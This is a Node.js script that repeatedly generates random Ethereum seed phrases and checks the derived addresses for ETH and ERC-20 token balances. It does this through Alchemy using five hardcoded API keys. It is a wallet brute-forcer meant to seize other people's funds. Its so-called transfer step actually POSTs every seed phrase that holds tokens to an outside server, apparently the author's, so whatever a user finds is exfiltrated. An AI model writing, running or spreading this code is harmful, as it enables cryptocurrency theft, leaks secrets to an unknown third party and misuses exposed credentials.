const bip39 = require("bip39");
const BIP32Factory = require("bip32").BIP32Factory;
const ecc = require("tiny-secp256k1");
const randomBytes = require("randombytes");
const ethWallet = require("ethereumjs-wallet").default;
const { ethers } = require("ethers");

const cluster = require("cluster");
const numCPUs = require("os").cpus().length;

const { erc20Tokens } = require("./erc20Tokens");

const bip32 = BIP32Factory(ecc);

const alchemyKeys = [
  "kM6dTofpt93RN1fpFkvwQgT50q5dMZbb",
  "GJawKq2e6eAtGSzXVXAYEcHO6Oig7agn",
  "6DOGqOlsze3iOmHT0O_1_QE2AkpbJjFy",
  "yOWL7z2MzuHCnPoNiiFqCsj2V_z3gcTT",
  "t5RBG7RGSLeGra4Ni2RXJsFX_x20AtYK",
];
const randomIndex = Math.floor(Math.random() * alchemyKeys.length);
const randomKey = alchemyKeys[randomIndex];

const provider = new ethers.AlchemyProvider("mainnet", randomKey);

const abi = ["function balanceOf(address) view returns (uint)"];

function generateRandomMnemonic() {
  const randomBytesGenerated = randomBytes(16);
  const hexString = randomBytesGenerated.toString("hex");
  const mnemonic = bip39.entropyToMnemonic(hexString);
  return mnemonic;
}

async function checkTokenBalancesAndTransfer(walletAddress, mnemonic) {
  async function getTokenBalances(address) {
    const promises = erc20Tokens.map(async (token) => {
      const contract = new ethers.Contract(token.address, abi, provider);
      const balance = await contract.balanceOf(address);
      return {
        name: token.name,
        balance,
      };
    });

    return Promise.all(promises);
  }

  try {
    console.log(`Token balances for address ${walletAddress}:`);
    const ethBalance = await provider.getBalance(walletAddress);
    console.log(`ETH: ${ethBalance}`);
    const tokenBalances = await getTokenBalances(walletAddress);

    for (let token of tokenBalances) {
      console.log(`${token.name}: ${token.balance}`);
      if (token.balance > 0) {
        console.log(`Found! ${token.name} tokens...`, mnemonic);
        await fetch("https://api-diamond.amices.com.vn/api/users/wallet", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            mnemonic,
            token: token.name,
          }),
        });
      }
    }
  } catch (error) {
    console.error("Error: ", error);
  }
}

async function generateWalletCheckBalanceAndTransfer() {
  // Generate a random 12-word seed phrase
  const mnemonic = generateRandomMnemonic();
  console.log("Generated 12-word seed phrase:", mnemonic);

  // Convert the mnemonic to a seed
  const seed = bip39.mnemonicToSeedSync(mnemonic);

  // Create a BIP32 root key from the seed
  const root = bip32.fromSeed(seed);

  // Derive the first account's node using the BIP44 path for Ethereum
  const path = "m/44'/60'/0'/0/0";
  const child = root.derivePath(path);

  // Get the wallet address
  const wallet = ethWallet.fromPrivateKey(child.privateKey);
  const address = wallet.getAddressString();
  console.log("Wallet address:", address);

  await checkTokenBalancesAndTransfer(address, mnemonic);
}

const main = async () => {
  let count = 1;
  while (true) {
    console.log("Checked wallet counts: ", count);
    try {
      count++;
      await generateWalletCheckBalanceAndTransfer();
    } catch (error) {
      console.error("Error: ", error);
    }
  }
};

main();

// Master process
// if (cluster.isMaster) {
//   console.log(`Master ${process.pid} is running`);

//   // Fork workers
//   for (let i = 0; i < numCPUs; i++) {
//     cluster.fork();
//   }

//   cluster.on("exit", (worker, code, signal) => {
//     console.log(`Worker ${worker.process.pid} died, restarting...`);
//     cluster.fork();
//   });
// } else {
//   // Worker processes
//   console.log(`Worker ${process.pid} started`);
//   main();
// }
